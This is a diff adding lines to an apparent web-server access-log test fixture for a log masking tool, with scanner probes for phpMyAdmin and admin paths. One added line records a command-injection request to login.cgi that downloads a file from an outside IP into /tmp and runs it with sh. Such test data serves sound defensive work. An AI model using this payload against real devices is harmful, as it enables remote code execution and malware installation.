@@ -8,3 +8,10 @@
 10.10.10.12 - - [17/Jun/2016:07:07:07 +0000] "GET /administrator/components/com_joommyadmin/phpmyadmin/scripts/setup.php HTTP/1.1" 404 331 "-" "ZmEu"
 10.10.10.10 - - [17/Jun/2016:07:07:07 +0000] "GET /phpMyAdmin-3.0.1.0/scripts/setup.php HTTP/1.1" 404 298 "-" "ZmEu"
 10.10.10.11 - - [17/Jun/2016:13:14:00 +0000] "\xbfM\xa0\x8c\xd6\x1dIv#9\x8a\xcb@\xb2_sD\xed\"\xd8\xc7\xe6\xd2z\xce8\x81\xf8\xfe" 501 303 "-" "-"
+10.10.10.17 - - [23/May/2019:12:18:01 +0000] "GET /login.cgi?cli=aa ;wget" 400 909
+10.10.10.18 - - [23/May/2019:10:37:24 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://185.70.105.35/d%20-O%20-%3E%20/tmp/MEMES;chmod%20+x%20/tmp/MEMES;sh%20/tmp/MEMES%27$ HTTP/1.1" 400 0 "-" "Hello, World/2.0"
+10.10.10.19 - - [23/May/2019:07:21:46 +0000] "CONNECT antei.xyz:443 HTTP/1.1" 301 407 "-" "-"
+10.10.10.20 - - [14/May/2018:15:23:35 +0000] "HEAD http://192.168.0.10:80/phpmyadmin/ HTTP/1.1" 301 244 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
+10.10.10.21 - - [14/May/2018:16:31:13 +0000] "HEAD http://127.0.0.1:80/dbadmin/ HTTP/1.1" 301 240 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
+10.10.10.22 - - [23/May/2019:13:08:29 +0000] "GET /login.cgi?cli=aa ;wget; multi-masking test; somehostname; 192.168.0.10; 192.168.0.10; 127.0.0.1; somehostname; 127.0.0.1; 127.0.0.1" 400 909
+10.10.10.23 - - [23/May/2019:13:08:29 +0000] "GET /login.cgi?cli=aa ;wget; custom phrase masking test; fqdn.example.com; fqdn.example.com; test.example.com; don't mask me and mask me :); also case sensitivity...MaSk ME" 400 909
